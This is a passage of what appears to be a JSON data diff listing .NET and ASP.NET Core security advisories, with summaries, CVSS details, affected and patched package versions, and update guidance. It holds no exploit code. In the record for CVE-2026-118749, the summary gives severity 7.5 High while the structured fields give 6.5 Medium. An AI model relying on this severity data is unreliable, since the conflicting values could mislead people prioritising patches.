either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2026-118747](https://www.cve.org/CVERecord?id=CVE-2026-118747)\n\n### Acknowledgements\n\n- Anonymous\n\n### Revisions\n\nV1.0 (November 10, 2026): Advisory published.",
+      "cvssScore": 6.5,
+      "severity": "Medium",
+      "published": "2026-11-10",
+      "modified": "2026-11-10",
+      "cwe": {
+        "cwe_id": "CWE-407",
+        "name": "Inefficient Algorithmic Complexity"
+      },
+      "references": [
+        "https://github.com/dotnet/runtime/security/advisories/GHSA-vmv3-wvjp-wqpj",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-118747",
+        "https://github.com/dotnet/announcements/issues/501",
+        "https://github.com/dotnet/runtime/issues/137281",
+        "https://github.com/dotnet/core/blob/main/release-notes/10.0/10.0.15/10.0.15.md"
+      ],
+      "vulnerableProducts": [
+        "System.Formats.Cbor nuget"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-118749",
+      "summary": "## Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in ASP.NET Core. This advisory provides guidance on updating affected applications and components.\n\nMinimal API validation repeatedly copies a growing validation-error dictionary, allowing attacker-controlled collections to trigger quadratic CPU work after the client disconnects.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/505\n\n## CVSS Details\n\n- **Version:** 3.1\n- **Severity:** High\n- **Score:** 7.5 (base score)\n- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:U/RL:O/RC:C`\n- **Weakness:** CWE-407\n\n## Affected Platforms\n\n- **Platforms:** Windows, Linux, macOS\n- **Architectures:** All\n\n## <a name=\"affected-packages\"></a>Affected Packages\n\nThe tables list affected version ranges and fixed package versions. Runtime and standalone deliveries are listed separately.\n\n### .NET 11.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n\n### Standalone validation delivery\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.Extensions.Validation](https://www.nuget.org/packages/Microsoft.Extensions.Validation) | >= 11.0.0-rc.1.26425.128, <= 11.0.0-rc.3.26522.148 | 11.0.0\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nCheck the deployed runtime and application package versions against the affected ranges above. Self-contained applications include their own runtime; updating a machine-wide runtime does not replace it.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\nInstall the applicable runtime or update each independently referenced package to the fixed version above. Restart applications. Rebuild and redeploy self-contained applications; updating a machine-wide runtime does not replace their embedded runtime. An SDK update alone does not update an application's standalone package references.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue).\n\nSecurity reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2026-118749](https://www.cve.org/CVERecord?id=CVE-2026-118749)\n\n### Acknowledgements\n\n- Alejandro Pacheco\n- Artur Stetsko\n\n### Revisions\n\nV1.0 (November 10, 2026): Advisory published.",
+      "cvssScore": 6.5,
+      "severity": "Medium",
+      "published": "2026-11-10",
+      "modified": "2026-11-10",
+      "cwe": {
+        "cwe_id": "CWE-407",
+        "name": "Inefficient Algorithmic Complexity"
+      },
+      "references": [
+        "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-m28h-pj36-4364",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-118749",
+        "https://github.com/dotnet/announcements/issues/505",
+        "https://github.com/dotnet/aspnetcore/discussions/70468",
+        "https://github.com/dotnet/aspnetcore/releases/tag/v11.0.0"
+      ],
+      "vulnerableProducts": [
+        "Microsoft.AspNetCore.App.Runtime.linux-arm nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-arm64 nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-arm nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-x64 nuget"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-114149",
+      "summary": "## Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in ASP.NET Core. This advisory provides guidance on updating affected applications and components.\n\nMultipart form processing can bypass the configured header-count limit and consume excessive resources.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/511\n\n## CVSS Details\n\n- **Version:** 3.1\n- **Severity:** High\n- **Score:** 7.5 (base score)\n- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:U/RL:O/RC:C`\n- **Weakness:** CWE-770\n\n## Affected Platforms\n\n- **Platforms:** Windows, Linux, macOS\n- **Architectures:** All\n\n## <a name=\"affected-packages\"></a>Affected Packages\n\nThe tables list affected version ranges and fixed package versions. Runtime and standalone deliveries are listed separately.\n\n### .NET 8.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 8.0.0-preview.1.23112.2, <= 8.0.33 | 8.0.34\n\n### .NET 9.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n\n### .NET 10.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n\n### .NET 11.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n\n### Standalone WebUtilities delivery\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.WebUtilities](https://www.nuget.org/packages/Microsoft.AspNetCore.WebUtilities) | >= 8.0.0-preview.5.23302.2, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.WebUtilities](https://www.nuget.org/packages/Microsoft.AspNetCore.WebUtilities) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.WebUtilities](https://www.nuget.org/packages/Microsoft.AspNetCore.WebUtilities) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.WebUtilities](https://www.nuget.org/packages/Microsoft.AspNetCore.WebUtilities) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nCheck the deployed runtime and application package versions against the affected ranges above. Self-contained applications include their own runtime; updating a machine-wide runtime does not replace it.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\nInstall the applicable runtime or update each independently referenced package to the fixed version above. After updating standalone packages, rebuild and redeploy affected applications, including framework-dependent applications; restarting alone does not replace app-local packages. Restart applications. Rebuild and redeploy self-contained applications; updating a machine-wide runtime does not replace their embedded runtime. An SDK update alone does not update an application's standalone package references.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue).\n\nSecurity reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2026-114149](https://www.cve.org/CVERecord?id=CVE-2026-114149)\n\n### Acknowledgements\n\n- n0irx\n\n### Revisions\n\nV1.0 (November 10, 2026): Advisory published.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2026-11-10",
+      "modified": "2026-11-10",
+      "cwe": {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      },
+      "references": [
+        "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-x33c-w48q-qrgc",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-114149",
+        "https://github.com/dotnet/announcements/issues/511",
+        "https://github.com/dotnet/aspnetcore/commit/e2fdf87f23ce5747bce1ac9a8c34905b17799a68",
+        "https://github.com/dotnet/aspnetcore/commit/eea3265c048c88f9c064fc1ff2b3be9570b6f8cc"
+      ],
+      "vulnerableProducts": [
+        "Microsoft.AspNetCore.App.Runtime.linux-arm nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-arm64 nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-arm nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-x64 nuget"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-109476",
+      "summary": "## Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in ASP.NET Core. This advisory provides guidance on updating affected applications and components.\n\nA crafted `X-Forwarded-Prefix` can inject cookie path delimiters unless PathBase-derived cookie paths percent-encode semicolons.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/508\n\n## CVSS Details\n\n- **Version:** 3.1\n- **Severity:** Medium\n- **Score:** 6.1 (base score)\n- **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N/E:U/RL:O/RC:C`\n- **Weakness:** CWE-116\n\n## Affected Platforms\n\n- **Platforms:** Windows, Linux, macOS\n- **Architectures:** All\n\n## <a name=\"affected-packages\"></a>Affected Packages\n\nThe tables list affected version ranges and fixed package versions. Runtime and standalone deliveries are listed separately.\n\n### .NET 8.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 8.0.0-rc.1.23421.29, <= 8.0.33 | 8.0.34\n\n### .NET 9.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 9.0.0-preview.1.24081.5, <= 9.0.22 | 9.0.23\n\n### .NET 10.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 